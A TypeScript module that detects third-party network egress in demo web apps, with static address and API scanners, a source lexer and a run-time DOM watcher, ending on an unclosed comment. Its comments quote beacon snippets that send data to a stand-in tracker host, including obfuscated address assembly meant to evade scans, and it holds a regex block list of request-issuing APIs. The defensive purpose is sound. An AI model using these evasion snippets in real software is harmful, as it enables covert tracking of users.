/**
 * CAN ANYTHING IN THIS BUNDLE CAUSE A REQUEST TO A HOST WE DO NOT CONTROL?
 *
 * ── THE GUARD THIS REPLACES, AND HOW IT WAS BEATEN ──────────────────────────
 *
 * D11 says a demo makes no real third-party call. Every repo in this wave
 * enforced that as a grep for five literal words — `fetch(`, `XMLHttpRequest`,
 * `new WebSocket`, `navigator.sendBeacon`, `EventSource`. A verifier put two
 * real requests into a shipped component with none of them:
 *
 *     const img = new Image();
 *     img.src = "https://tracking.example-analytics.net/p?c=" + count;
 *
 * Every gate in three repos stayed green, and the bytes reached the live host
 * app's bundle. The list was written against the examples its author had in
 * mind; an image beacon was not one of them, and neither is a `<script>` tag, a
 * `<link rel=preconnect>`, a form `action`, a CSS `url()`, an `<iframe>`, a
 * `Worker`, a dynamic `import()`, a `FontFace`, an `RTCPeerConnection`, or
 * `sendBeacon` reached through an alias.
 *
 * Enumerating those too would produce a longer list with the same defect. So
 * this states the CATEGORY, and it takes two nets to do it, because a request
 * to a host we do not control needs two things and either one is enough to
 * stop it.
 *
 * ── NET ONE: AN ADDRESS (static, over sources AND built output) ─────────────
 *
 * To reach a host you need to name it. `offendingAddresses` finds every
 * absolute or protocol-relative URL in a file and reports any whose ORIGIN is
 * not on a declared inert list. The origin is the unit because the origin is
 * what "a host we do not control" means; a path is not.
 *
 * An inert entry is a decision somebody wrote down, with a reason, at the call
 * site — never a pattern this module guesses at. Two exist in this wave and
 * both are named where they are used: the XML namespace an `<svg>` element
 * carries, which is an identifier no agent ever dereferences, and Canva's
 * declared OAuth endpoints, which no code in the repo calls (the host runs the
 * flow — 24 §5.6) and which the manifest's `network.allow` pins.
 *
 * This is the net that catches the mutant above: the tracker's address is a
 * literal, in the source and in the minified bundle, and it is on nobody's
 * list.
 *
 * ── NET TWO: A WAY TO SEND (static, over sources AND built output) ──────────
 *
 * An address can be assembled from fragments a grep cannot reassemble. So the
 * APIs whose ONLY purpose is to issue a request are banned outright:
 * `SENDERS` below. Their presence is the defect whatever address they are
 * given, which is why this net does not care about the value.
 *
 * WHAT IS DELIBERATELY NOT IN `SENDERS`, and why net three exists: assigning to
 * `src`, `href`, `action`, `data`, `poster` or `srcset`. These apps do it for
 * real and correctly — a `blob:` URL is how a label PDF and an exported SVG are
 * handed to the reader — so a static ban on the ASSIGNMENT would fire on
 * working code, and a static ban that fires on working code gets an exemption
 * list, and an exemption list is where the last nine of these defects came
 * from. What makes those assignments safe or not is the VALUE, and a value is
 * not a static property.
 *
 * ── NET THREE: THE VALUE, AT RUN TIME (hosts, over the rendered app) ────────
 *
 * `watchEgress` instruments the running page: every request-issuing global,
 * every URL-bearing property setter on every element prototype, `setAttribute`
 * and `setAttributeNS`, and a sweep of the finished DOM. Anything handed a URL
 * that is not same-origin, relative, `blob:`, `data:` or `about:` is recorded,
 * however the code spelled it and however the address was assembled. Missing
 * globals (`EventSource`, `RTCPeerConnection`, `Worker` — jsdom has no such
 * thing) are DEFINED as recorders rather than left undefined, so a caller is
 * caught rather than crashing with a message about something else.
 *
 * This is the net that observes the effect instead of the spelling, and it is
 * the reason the three nets together are a rule rather than a fourth list.
 *
 * ── AND THE THREE WAYS ROUND IT, WHICH WERE THE SAME MISTAKE AGAIN ──────────
 *
 * [Widened 2026-08-11, wave 4b round 6.] Three real outbound requests were put
 * into a shipped, always-rendered component and every D11 gate in both hosts
 * stayed green — 35 passing cases in one, 36 in the other:
 *
 *     window.open(`https://${host}/p?c=` + count);         // a NAVIGATION
 *     style.textContent = `.x{background-image:url(…)}`;   // CSS THE BROWSER RESOLVES
 *     el.innerHTML = '<img src="…">';                      // MARKUP FROM A STRING
 *
 * None of them touches a request-issuing global and none of them assigns to a
 * URL-bearing property, which is all this net watched. The list of GLOBALS was
 * complete and the list of SETTERS was complete, and the category was not:
 *
 *   A PROPERTY ASSIGNMENT IS ONE DOOR OF THREE. `innerHTML`, `outerHTML`,
 *   `insertAdjacentHTML`, `document.write` and `DOMParser` all build elements
 *   from TEXT. The parser sets no property this code can wrap, so the markup
 *   itself is read.
 *
 *   NOT EVERY FETCH IS ASKED FOR BY JAVASCRIPT. A `background-image`, an
 *   `@import`, a `cursor`, a `@font-face` src — the browser resolves those out
 *   of CSS, and CSS arrives as the text of a `<style>`, as a `cssText`, through
 *   `insertRule`, or in a `style=` attribute. So CSS is read as CSS wherever it
 *   enters, and the sweep re-reads every stylesheet in the page.
 *
 *   AND A NAVIGATION IS A REQUEST. `window.open`, `location.assign`,
 *   `location.replace`. Nothing is fetched INTO the page, so nothing this net
 *   watched could see it, and a tracker cares about neither distinction.
 *
 *   THE SWEEP READ THE WRONG ROOT, too: it was handed the element the tour
 *   mounted, so anything appended to `document.body` or `document.head` —
 *   which is where injected markup and injected styles go — was outside it. It
 *   sweeps the whole document now, and the passed root as well.
 *
 * A prefetch hint, an SVG `<use href>` and an `<object data>` are all covered
 * already, by the attribute sweep rather than by a rule of their own; they are
 * named in the cases so that a reader can see them being covered.
 *
 * ── AND THE THREE AFTER THOSE, WHICH IS WHY THE SECTION BELOW EXISTS ────────
 *
 * [Widened again 2026-08-11, wave 4b round 7.] Three more went into an
 * always-rendered component, with the address assembled at run time so that
 * neither static net could see it — `["tracking", ".", "example",
 * "-analytics", ".net"].join("")` and `"ht" + "tps:" + "//"` — and all three
 * nets stayed green in both hosts:
 *
 *     iframe.srcdoc = '<img src="…">';                    a DOCUMENT as text
 *     <meta http-equiv="refresh" content="0;url=…">       a NAVIGATION
 *     <link rel=preload as=image imagesrcset="… 1x">      a FETCH
 *
 * The first is markup by another name and is parsed as markup now. The other
 * two are addresses in attributes that no list of URL-bearing attributes will
 * ever contain all of, so the repair is not two more entries: ANY address in
 * ANY attribute is a finding (`scanAttribute`), with one exemption for
 * namespace declarations, which name a vocabulary and are never fetched. The
 * same widening covers CSS that names an address without `url()` —
 * `image-set("…")` was a fourth.
 *
 * ═══════════════════════════════════════════════════════════════════════════
 * WHAT THESE NETS PROVE, AND WHAT THEY DO NOT. READ THIS BEFORE YOU TREAT A
 * GREEN SUITE AS AN ANSWER.
 * ═══════════════════════════════════════════════════════════════════════════
 *
 * THE ABSENCE OF EGRESS CANNOT BE PROVED BY ANY OF THIS, and no amount of
 * further widening changes that. Each net has a boundary that is a property of
 * the net rather than a gap somebody forgot to close:
 *
 *   NET ONE (addresses, static) proves: no LITERAL address to an undeclared
 *   origin is in our sources or in the built bundle. It proves nothing about an
 *   address assembled at run time, which is one `join("")` away and is how
 *   every mutant since round 5 has been written. In a CONNECTED build it proves
 *   one thing less, and `connectedBackend` below is where that is written down:
 *   the Adminium instance the build was pointed at is a declared address, so
 *   the claim narrows from "no undeclared address" to "no undeclared address
 *   except the one backend this build was configured with".
 *
 *   NET TWO (senders, static) proves: no source in `src/` NAMES an API whose
 *   only purpose is to issue a request, in the spellings listed. It is a
 *   regression-resistant list rather than a rule, because a sender reached
 *   through an alias (`const g = window["fe" + "tch"]`) is invisible to it, and
 *   because it is not run over the built output at all — Vite's own
 *   module-preload polyfill compiles a literal `fetch(…)` into the entry chunk,
 *   so a sender scan over the bundle would need a carve-out on day one. That
 *   division is deliberate and it is stated in `builtOutput.test.ts`: senders
 *   over our sources, addresses over the bundle, behaviour at run time.
 *
 *   NET THREE (values, run time) proves: on the code paths a tour actually
 *   walked, in the environment the tour ran in, nothing was handed an address
 *   off this origin through any door this file wraps. THREE LIMITS, all real:
 *
 *     · IT ONLY SEES WHAT THE TOUR REACHES. A request behind a condition no
 *       press can produce — a date, a random draw, a state a fixture never
 *       enters — is not observed. Tour completeness is its own gate
 *       (`testing/tour.test.tsx`) precisely because this one depends on it.
 *     · IT ONLY SEES WHAT JSDOM DOES. jsdom does not fetch, does not lay out,
 *       does not run `srcdoc`, and implements neither `setHTMLUnsafe` nor
 *       `Document.parseHTMLUnsafe`. This file WATCHES those doors, but a
 *       browser-only behaviour cannot be exercised here at all. A measured
 *       instance, so that this is not an abstraction: React writes an inline
 *       style through the CSS property rather than the attribute, and jsdom's
 *       CSS parser DISCARDS a declaration it cannot parse — so
 *       `style={{ backgroundImage: 'image-set("https://…")' }}` in a component
 *       leaves nothing in the DOM for the sweep to find, while the same
 *       declaration through `setAttribute("style", …)` is reported. A real
 *       browser would fetch the first one. The case below drives the door; the
 *       environment is what cannot reach it.
 *     · IT CANNOT WATCH `location`. `Location` is [Unforgeable] — own,
 *       non-configurable members, no prototype — so `location.href = …` is
 *       covered by net two's list of three spellings and nothing else. This is
 *       stated again where the attempt was made and abandoned.
 *
 * SO THE HONEST CLAIM IS THIS: a green suite says nobody has yet written the
 * kinds of outbound call these three nets are shaped to see, on the paths that
 * were walked. It does not say the app makes no third-party call. A verifier
 * has beaten this file three times — a beacon, then a navigation, CSS and
 * parsed markup, then the three above — and the correct expectation is that a
 * fourth pass finds a fourth shape. What the file can promise is that each
 * repair has been a CATEGORY (a door, not a name) and that every shape found so
 * far is driven by a case that fails if the repair is ever quietly dropped.
 *
 * ── ONE FILE, THREE REPOS, BYTE FOR BYTE ────────────────────────────────────
 *
 * The add-ons monorepo and both host apps each carry this file. They cannot
 * import each other: a host is a standalone Vite SPA published from a clean
 * clone with no sibling checkout of anything, and the monorepo must be green
 * with no host beside it. The copies are kept honest the way the host seam is —
 * `packages/host/src/host-mirror.test.ts` reads all three and fails on any
 * difference — so a repair made in one is a repair made in all three or a red
 * suite.
 */

/** A URL a reader of this file has decided can never cause a request. */
export interface InertOrigin {
  /** `scheme://host`, exactly as it is written in the code. */
  readonly origin: string;
  /** Why it cannot cause a request. A reviewer reads this, not the pattern. */
  readonly why: string;
}

/**
 * Every absolute or protocol-relative URL in a text, in the order they appear.
 *
 * Deliberately crude about what a URL is: anything with a scheme and `//`, or
 * starting `//` against a host-looking token. A minifier rewrites strings, a
 * bundler concatenates them, and CSS writes `url(https://…)` with no quotes —
 * this has to find an address in all of that, and over-finding is harmless
 * because the origin is then checked against a list somebody wrote.
 */
export function addressesIn(text: string): string[] {
  const out: string[] = [];
  const pattern = /(?:[a-zA-Z][a-zA-Z0-9+.-]*:)?\/\/[^\s'"`()<>\\]+/g;
  for (const [match] of text.matchAll(pattern)) {
    // `a // b` in prose, and the `//` of a stripped line comment, are not
    // addresses: an address has a dot or a `${` in its authority.
    const authority = match.replace(/^[a-zA-Z][a-zA-Z0-9+.-]*:/, "").slice(2);
    const host = authority.split(/[/?#]/)[0] ?? "";
    if (host === "" || !/[.]|\$\{/.test(host)) continue;
    out.push(match);
  }
  return out;
}

/** `scheme://host` of an address, keeping whatever the code actually wrote. */
export function originOf(address: string): string {
  const scheme = /^([a-zA-Z][a-zA-Z0-9+.-]*:)/.exec(address)?.[1] ?? "";
  const authority = address.slice(scheme.length + 2);
  const host = authority.split(/[/?#]/)[0] ?? "";
  return `${scheme}//${host}`;
}

/**
 * Every address in `text` whose origin nobody has declared inert.
 *
 * The comparison is on the ORIGIN and it is exact. A declared
 * `https://api.canva.com` forgives that host and no other, so
 * `https://api.canva.com.attacker.test` — a different host that starts with the
 * same letters — is reported, which a `startsWith` would not do.
 */
export function offendingAddresses(text: string, inert: readonly InertOrigin[]): string[] {
  const allowed = new Set(inert.map((entry) => entry.origin));
  return addressesIn(text).filter((address) => !allowed.has(originOf(address)));
}

/**
 * The one address a CONNECTED build is configured to reach (28-T26).
 *
 * ── WHY THIS EXISTS ────────────────────────────────────────────────────────
 * These apps ship as demos with no backend, and NET ONE is at its strictest
 * state for exactly that reason: `OURS` is empty, so EVERY address is a
 * finding. Connecting one to an Adminium instance breaks that, and it was
 * worth measuring rather than assuming HOW. A build with
 * `VITE_ADMINIUM_API_BASE_URL` set adds precisely one offender:
 *
 *     offenders a CONNECTED build adds: [ 'https://api.tenant.example.test' ]
 *
 * Vite inlines the variable as a string literal into the entry chunk, so the
 * origin is in the shipped bytes and NET ONE reports it. Nothing else changes:
 * measured on the same build, `sendersIn` and `foreignImportsIn` both return
 * `[]` for a connected data source, because it names no request-issuing API —
 * it imports a client that does, and a STATIC import is not something NET TWO
 * looks at (`foreignImportsIn` reads dynamic `import()` only). So the plan's
 * "relax NET TWO for a declared file" would have relaxed a net that never
 * fired, and left the one that does still red.
 *
 * ── WHY AN ORIGIN AND NOT A FILE ───────────────────────────────────────────
 * A file-scoped exemption — "`data/adminiumSource.ts` may do what it likes" —
 * is the shape this file already argues against twice, and it is strictly
 * weaker: it would forgive that file ANY address and ANY sender, including the
 * beacon that beat the word list. An origin taken from the build configuration
 * forgives ONE host, in EVERY file, and nothing else. A tracker's address is
 * still a finding in the connected data source itself.
 *
 * ── THIS ENTRY IS NOT INERT, AND SAYING SO MATTERS ─────────────────────────
 * Every other entry on the list is an address that CANNOT cause a request — a
 * namespace, a message React prints. This one can, and is meant to: it is the
 * app talking to its own backend. It shares `InertOrigin` because
 * `offendingAddresses` reads only `.origin`, but a reviewer reads the `why`,
 * and the `why` says what it is. The composed list is "declared"; "inert" is
 * its stricter subset.
 *
 * ── FAILING CLOSED ─────────────────────────────────────────────────────────
 * Unset (a demo build, and every marketplace clone) declares nothing, so the
 * gate is byte-identically as strict as it was. Anything that is not exactly
 * one absolute address also declares nothing — a half-written value does not
 * quietly widen the net, it leaves the inlined literal to be reported.
 *
 * The origin is taken with this file's own `originOf` rather than `new URL`,
 * so both sides of the comparison spell a host the same way; `new URL` drops a
 * default port that the inlined literal would still carry.
 */
export function connectedBackend(baseUrl: string | undefined): readonly InertOrigin[] {
  const value = (baseUrl ?? "").trim();
  const [address] = addressesIn(value);
  // Exactly one address, and nothing around it.
  if (address === undefined || address !== value) return [];
  return [
    {
      origin: originOf(address),
      why: "the Adminium instance this build was configured to talk to (VITE_ADMINIUM_API_BASE_URL). NOT inert - this one is meant to be reached; it is declared because the operator who built this chose it",
    },
  ];
}

/**
 * APIs that exist to issue a request and do nothing else.
 *
 * Every entry is banned whatever it is handed, because there is no address any
 * of them could be given that a demo needs. `Image` and `Audio` are here for
 * the same reason: an `Image` that is never in the document is not a picture,
 * it is a beacon, and that is the shape that beat the old grep.
 *
 * Written without a receiver on purpose — `sendBeacon` and not
 * `navigator.sendBeacon` — so aliasing the object it hangs off does not hide
 * the call. `fetch` is the one that needs a boundary, because `prefetch` and
 * `refetch` are ordinary identifiers.
 */
export const SENDERS: readonly { pattern: RegExp; means: string }[] = [
  { pattern: /(?<![\w$.])fetch\s*\(/, means: "fetch()" },
  { pattern: /XMLHttpRequest/, means: "XMLHttpRequest" },
  { pattern: /WebSocket/, means: "a WebSocket" },
  { pattern: /EventSource/, means: "an EventSource (server-sent events)" },
  { pattern: /sendBeacon/, means: "sendBeacon(), under any receiver" },
  /*
   * `\b` AND NOT `\s*\(`, WHICH IS THE FORM THAT ALREADY GOT AWAY ONCE.
   *
   * A minifier drops the empty argument list: `new Image()` in a source is
   * `new Image` in `dist/`, and a pattern anchored on the parenthesis reads a
   * live beacon in a shipped bundle as clean. That is not hypothetical — it is
   * what this file's first draft did to the very mutant it was written for,
   * caught by grepping the built output by hand.
   */
  { pattern: /(?<![\w$.])new\s+Image\b/, means: "new Image — an image beacon" },
  { pattern: /(?<![\w$.])new\s+Audio\b/, means: "new Audio — an audio beacon" },
  { pattern: /(?<![\w$.])new\s+(?:Shared)?Worker\b/, means: "a Worker, which fetches its own script" },
  { pattern: /serviceWorker/, means: "a service worker" },
  { pattern: /importScripts/, means: "importScripts()" },
  { pattern: /RTCPeerConnection/, means: "WebRTC, which reaches a STUN/TURN server" },
  { pattern: /(?<![\w$.])new\s+FontFace\b/, means: "FontFace, which loads a font by URL" },
  { pattern: /navigator\.connection|navigator\.sendB/, means: "a navigator egress API" },
  { pattern: /(?<![\w$.])(?:axios|superagent)\s*[.(]/, means: "an HTTP client library" },
  { pattern: /\$\.(?:ajax|get|post)\s*\(/, means: "jQuery's HTTP helpers" },
  { pattern: /registerProtocolHandler/, means: "registerProtocolHandler()" },
  /*
   * A NAVIGATION IS A REQUEST for a whole document, and none of these fetches
   * anything INTO the page — which is why the run-time net, which watches what
   * arrives, could not see `window.open` and cannot see `location` at all (its
   * members are unforgeable; `watchEgress` says so where it gives up).
   *
   * `window.` and its synonyms are required rather than optional: `open` on its
   * own is an ordinary method name, and the personalizer contract's own
   * `open(product)` is called bare in shipped code. The run-time net covers
   * that spelling — it replaces the property on the window object, so a call
   * that reaches it however it was written is recorded.
   */
  {
    pattern: /(?<![\w$.])(?:window|self|top|parent|globalThis)\s*\.\s*open\s*\(/,
    means: "window.open(), which navigates",
  },
  {
    pattern:
      /(?<![\w$.])(?:(?:window|self|top|parent|document|globalThis)\s*\.\s*)?location\s*\.\s*(?:assign|replace)\s*\(/,
    means: "location.assign()/replace(), a navigation",
  },
  {
    pattern:
      /(?<![\w$.])(?:(?:window|self|top|parent|document|globalThis)\s*\.\s*)?location\s*\.\s*href\s*=(?!=)/,
    means: "location.href = …, a navigation",
  },
  { pattern: /\bnavigator\.geolocation/, means: "geolocation, which calls out to locate" },
];

/** Every sender named in `code`. Pass code with its comments already stripped. */
export function sendersIn(code: string): string[] {
  return SENDERS.filter((sender) => sender.pattern.test(code)).map((sender) => sender.means);
}

/**
 * A dynamic `import()` of anything but a relative literal.
 *
 * Held apart from `SENDERS` because `import("./thing.ts")` is ordinary code
 * splitting and `import(whateverTheServerSaid)` is a script from somewhere
 * else. The distinction is the ARGUMENT, so it cannot be one more regex in a
 * list that ignores arguments.
 */
export function foreignImportsIn(code: string): string[] {
  const out: string[] = [];
  for (const [, arg] of code.matchAll(/(?<![\w$.])import\s*\(\s*([^)]*)\)/g)) {
    const spec = (arg ?? "").trim().replace(/\/\*[^*]*\*\/\s*/g, "");
    if (/^(["'])\.{1,2}\/[^"']*\1$/.test(spec)) continue; // a relative literal
    out.push(`import(${spec.slice(0, 60)})`);
  }
  return out;
}

/** A package a shipped source is allowed to import, and why that is safe. */
export interface AllowedModule {
  /** The package: `react`, `@scope/thing`. A subpath of it is covered too. */
  readonly name: string;
  /** Why code from outside this repo may ship. A reviewer reads this. */
  readonly why: string;
}

/** A source with comments gone, and its literals held where a scan cannot misread them. */
export interface LexedSource {
  /** Comments removed. String and template literals left exactly as written. */
  readonly code: string;
  /** Comments removed AND every literal's CONTENT replaced by a placeholder. */
  readonly masked: string;
  /** The literal contents, indexed by the number inside the placeholder. */
  readonly literals: readonly string[];
}

/** `startsRegex` needs the tail of the code, because `return /x/` is a regex. */
const KEYWORD_BEFORE_REGEX =
  /(?:^|[^\w$])(?:return|typeof|instanceof|in|of|new|delete|void|throw|case|do|else|yield|await)\s*$/;

function startsRegex(emitted: string, previous: string): boolean {
  if (previous === "") return true;
  if ("(,=:[!&|?{};+-*%~^<>".includes(previous)) return true;
  return KEYWORD_BEFORE_REGEX.test(emitted);
}

/**
 * Read a source the way a compiler does: as code, comments, and literals.
 *
 * ── WHY THIS EXISTS, AND WHAT IT REPLACED ──────────────────────────────────
 *
 * [Added 2026-08-20, after an adversarial pass beat every static net in this
 * file at once.] Each host repo stripped comments before scanning, with two
 * regexes that knew nothing about strings: one deleting everything between a
 * block-comment opener and the next closer, one deleting from a double slash
 * to end of line. So a source could carry this, and every static net went
 * blind:
 *
 *     const openTok = "x " + SLASH_STAR;
 *     import { track } from "some-analytics-sdk";
 *     const closeTok = STAR_SLASH;
 *
 * With those two tokens written out as literals, the opener inside the FIRST
 * STRING began a comment that ran to the closer inside the third, and the
 * import between them was deleted before any scanner saw it. Measured end to
 * end: the suite stayed green, the module was bundled, and a run-time-assembled
 * beacon URL reached `dist/`. The same two literals hide `new Image()` from
 * `sendersIn` and a literal address from `offendingAddresses` — it was not one
 * gate's hole, it was the harness's.
 *
 * The author had already seen half of this: the `[^:]` guard in the line-comment
 * regex is there so a `https` prefix inside a string is not read as a comment.
 * There was no counterpart for block comments, and a rule that handles one case
 * of a category and not the other is the shape this whole file argues against.
 *
 * ── AND THE OTHER HALF: A LITERAL IS NOT CODE ──────────────────────────────
 *
 * The reverse failure is a FALSE POSITIVE, which this codebase treats as a
 * defect and not a nit, because a gate that fires on working code earns an
 * exemption list and an exemption list is where its defects came from. A docs
 * snippet in a template literal is prose, not a statement, and the first draft
 * of the import scanner reported the package it mentions as undeclared.
 *
 * `masked` replaces every literal's CONTENT with a placeholder, so a scanner
 * reading it cannot mistake prose for a statement, while the specifier of a
 * REAL import is recovered from `literals` by index.
 *
 * ── WHAT IT DOES NOT DO ────────────────────────────────────────────────────
 *
 * It is a lexer, not a parser, and three approximations are deliberate: a
 * template's substitution is kept inside the literal rather than lexed as the
 * code it is (nothing that looks like an import statement can legally live
 * there); a regex literal is told from division by the standard previous-token
 * heuristic, which is what every fast tokenizer does and is not provably exact;
 * and an unterminated literal ends at its line rather than running to the end
 * of the file, so a typo cannot blank the rest of a source.
 */
export function lexSource(source: string): LexedSource {
  let code = "";
  let masked = "";
  const literals: string[] = [];
  let previous = "";
  let i = 0;
  const n = source.length;

  const emit = (text: string): void => {
    code += text;
    masked += text;
  };

  const keep = (quote: string, content: string): void => {
    const index = literals.length;
    literals.push(content);
    code += quote + content + quote;
    masked += `${quote} ${String(index)} ${quote}`;
    // A multi-line literal must not collapse the line count, or a reader given
    // a line number is sent to the wrong place.
    const newlines = content.split("\n").length - 1;
    if (newlines > 0) masked += "\n".repeat(newlines);
  };

  while (i < n) {
    const ch = source[i] as string;
    const next = source[i + 1];

    if (ch === "/" && next === "/") {
      while (i < n && source[i] !== "\n") i += 1;
      continue;
    }

    if (ch === "/" && next === "*") {
      i += 2;
      while (i < n && !(source[i] === "*" && source[i + 1] === "/")) {
        if (source[i] === "\n") emit("\n");
        i += 1;
      }
      i += 2;
      emit(" ");
      previous = " ";
      continue;
    }

    if (ch === "/" && startsRegex(code, previous)) {
      let j = i + 1;
      let inClass = false;
      let closed = false;
      while (j < n) {
        const c = source[j] as string;
        if (c === "\\") {
          j += 2;
          continue;
        }
        if (c === "\n") break;
        if (c === "[") inClass = true;
        else if (c === "]") inClass = false;
        else if (c === "/" && !inClass) {
          closed = true;
          break;
        }
        j += 1;
      }
      if (closed) {
        j += 1;
        while (j < n && /[a-z]/.test(source[j] as string)) j += 1;
        // A regex body may hold quotes, and reading one as a string is how a
        // lexer swallows the next real import.
        emit(source.slice(i, j));
        previous = "/";
        i = j;
        continue;
      }
    }

    if (ch === '"' || ch === "'") {
      let j = i + 1;
      let content = "";
      while (j < n) {
        const c = source[j] as string;
        if (c === "\\") {
          content += c + (source[j + 1] ?? "");
          j += 2;
          continue;
        }
        if (c === ch || c === "\n") break;
        content += c;
        j += 1;
      }
      keep(ch, content);
      previous = ch;
      i = source[j] === ch ? j + 1 : j;
      continue;
    }

    if (ch === "`") {
      let j = i + 1;
      let content = "";
      let depth = 0;
      while (j < n) {
        const c = source[j] as string;
        if (c === "\\") {
          content += c + (source[j + 1] ?? "");
          j += 2;
          continue;
        }
        if (depth === 0 && c === "`") break;
        if (c === "$" && source[j + 1] === "{") {
          depth += 1;
          content += "${";
          j += 2;
          continue;
        }
        if (depth > 0 && c === "{") depth += 1;
        else if (depth > 0 && c === "}") depth -= 1;
        content += c;
        j += 1;
      }
      keep("`", content);
      previous = "`";
      i = j + 1;
      continue;
    }

    emit(ch);
    if (!/\s/.test(ch)) previous = ch;
    i += 1;
  }

  return { code, masked, literals };
}

/**
 * A source with its comments gone and every literal intact.
 *
 * This is what the nets that read VALUES want — `offendingAddresses` is looking
 * for an address, and an address lives in a string. It differs from the two
 * regexes it replaced only in being right about which opener starts a comment.
 */
export function withoutComments(source: string): string {
  return lexSource(source).code;
}

/**
 * `react/jsx-runtime` maps to `react`; `@scope/a/b` to `@scope/a`; `node:fs` to itself.
 *
 * The PACKAGE is the unit for the same reason the ORIGIN is the unit in net
 * one: it is what "code from outside this repo" means. A subpath is not a
 * different author, it is a different file by the same one.
 *
 * A TRAVERSAL SEGMENT IS NOT A SUBPATH, and it is why this is a function rather
 * than a `split`. `react/../evil` does not resolve inside `react`, so it must
 * never inherit `react`'s allowance; it is returned whole, matches no
 * declaration, and is reported. Today most resolvers refuse it anyway because
 * `react` publishes an `exports` map — but that is the PACKAGE's protection,
 * not this gate's, and a dependency without one would hand the allowance over.
 */
export function packageOf(specifier: string): string {
  const segments = specifier.split("/");
  if (segments.some((segment) => segment === "." || segment === "..")) return specifier;
  if (specifier.startsWith("@")) {
    const [scope, name] = segments;
    return name === undefined ? specifier : `${scope}/${name}`;
  }
  return segments[0] ?? specifier;
}

/**
 * Every package a source imports that nobody has declared (28-T26 follow-up).
 *
 * ── THE HOLE THIS CLOSES, WHICH WAS IN NET TWO ALL ALONG ───────────────────
 *
 * `sendersIn` bans the APIs that issue a request, and `foreignImportsIn` bans a
 * dynamic `import()` of anything but a relative literal. Between them they read
 * as "no shipped source can reach outside this repo". They do not. A STATIC
 * import was never looked at by either:
 *
 *     import { track } from "some-analytics-sdk";   // matched nothing
 *     import "some-analytics-sdk";                  // matched nothing
 *
 * The `fetch` is in the SDK's code, not ours, so `sendersIn` sees a clean file;
 * `foreignImportsIn` reads a dynamic call and this is not that. Net one over
 * the bundle would catch such a package by its literal address — unless it
 * assembles one at run time, which this file's own prose calls one `join("")`
 * away and which is how every mutant since round 5 has been written.
 *
 * This was found by measuring what a CONNECTED build actually trips, not by a
 * verifier: the plan said to relax net two for the data source, and net two
 * turned out never to have fired on it.
 *
 * ── WHY AN ALLOWLIST IS THE RIGHT SHAPE HERE, HAVING ARGUED AGAINST ONE ────
 *
 * This file says twice that a static ban which fires on working code gets an
 * exemption list, and that an exemption list is where the defects came from.
 * That argument is about banning a SPELLING the app legitimately uses. This is
 * the other kind, and it is exactly `InertOrigin`: a closed set of things
 * somebody wrote down with a reason, where the DEFAULT IS REFUSAL. The set is
 * small enough to read — four packages across both hosts — and a fifth is a
 * decision somebody makes in a diff rather than a thing that slips in.
 *
 * ── IT READS `masked`, AND THAT IS THE WHOLE DESIGN ────────────────────────
 *
 * The first draft was anchored to the start of a line, to stop the word
 * `import` inside a string from being read as a statement. An adversarial pass
 * broke it from BOTH sides in one afternoon, which is what an anchor standing
 * in for a lexer earns:
 *
 *   IT MISSED REAL IMPORTS. `const a = 1; import { track } from "sdk";` is
 *   legal top-level ES that Vite bundles, and it does not begin its line.
 *   Neither does an import preceded by U+00A0 — the anchor allowed tab and
 *   space, while the ES WhiteSpace production also admits NBSP, FF, VT,
 *   U+2000-200A and U+FEFF. Both were driven end to end into a shipped bundle.
 *
 *   IT INVENTED FAKE ONES. A docs snippet, a README in a string, an install
 *   block rendered in a `pre` tag: any line inside a template literal that
 *   began with the word import was reported as a package that does not exist.
 *
 * Reading `lexSource().masked` answers both at once, because a literal's
 * CONTENT is no longer text a pattern can match, while a real specifier — which
 * is itself a literal — is recovered from `literals` by index. Anything that is
 * not a plain literal (a template, a concatenation, an identifier) resolves to
 * nothing and is skipped, which is correct: those are not static specifiers,
 * and a dynamic one is `foreignImportsIn`'s question.
 *
 * ── WHAT THIS STILL DOES NOT PROVE ─────────────────────────────────────────
 *
 * That a DECLARED package is safe. `react` is declared because a React app
 * imports React, not because anybody audited every line of it; a supply-chain
 * compromise inside a declared dependency is invisible here and is caught, if
 * at all, by net one over the built output and net three at run time. What this
 * proves is narrower and still worth having: no shipped source reaches for code
 * by a name nobody has agreed to.
 */
export function foreignModulesIn(source: string, allowed: readonly AllowedModule[]): string[] {
  const { masked, literals } = lexSource(source);
  const declared = new Set(allowed.map((entry) => entry.name));
  const out: string[] = [];
  const seen = new Set<string>();

  const consider = (placeholder: string): void => {
    const match = /^ (\d+) $/.exec(placeholder);
    if (match === null) return; // not a plain string literal
    const specifier = literals[Number(match[1])];
    if (specifier === undefined) return;
    // A relative specifier is this repo's own code, which every other gate in
    // this file already reads.
    if (specifier.startsWith(".")) return;
    if (declared.has(packageOf(specifier))) return;
    if (seen.has(specifier)) return;
    seen.add(specifier);
    out.push(specifier);
  };

  /*
   * `import … from "x"` and `export … from "x"`, across newlines. The clause
   * may not contain a semicolon, a quote or a paren — an import clause never
   * does — which stops the lazy match from stepping over a statement boundary
   * and gluing an unrelated `from` onto this one.
   */
  for (const [, spec] of masked.matchAll(
    /(?<![\w$.])(?:import|export)\s(?:[^;'"`()])*?\bfrom\s*["']([^"']*)["']/g,
  )) {
    if (spec !== undefined) consider(spec);
  }

  /*
   * AND THE ONE WITH NO BINDINGS, WHICH IS THE SHAPE THAT HIDES. `import "x"`
   * imports nothing and runs everything in `x` for its side effects, which is
   * precisely how a beacon package would be added: there is no symbol in the
   * file to notice, and no `from` for the pattern above to anchor on.
   */
  for (const [, spec] of masked.matchAll(/(?<![\w$.])import\s*["']([^"']*)["']/g)) {
    if (spec !== undefined) consider(spec);
  }

  return out;
}

/* ─────────────────────────────────────────────────────────────────────────── */
/*  NET THREE — THE VALUE, AT RUN TIME                                         */
/* ─────────────────────────────────────────────────────────────────────────── */

/** One thing the running page tried to reach. */
export interface EgressAttempt {
  /** How it was reached — `img.src`, `fetch`, `setAttribute("href")`. */
  via: string;
  /** The URL, exactly as the code supplied it. */
  url: string;
}

/**
 * Every attribute that can hold a URL a browser will go and get, or follow.
 *
 * `ping` and `cite` are here because they are URLs the page names, and a rule
 * about "an address in this page" that skipped two of them would be the same
 * kind of nearly-complete list this file exists to stop being.
 *
 * IT IS STILL A LIST, and this one was beaten too — see `ADDRESS IN ANY
 * ATTRIBUTE` below, which is the rule that stands behind it. What this list
 * buys is a good `via`: `<img src>` says what happened, and "an address in a
 * `content` attribute" only says that something is wrong.
 */
const URL_ATTRIBUTES: readonly string[] = [
  "src",
  "srcset",
  "href",
  "xlink:href",
  "data",
  "action",
  "formaction",
  "poster",
  "background",
  "cite",
  "ping",
  "manifest",
  "archive",
  "longdesc",
  "profile",
  "usemap",
];

/**
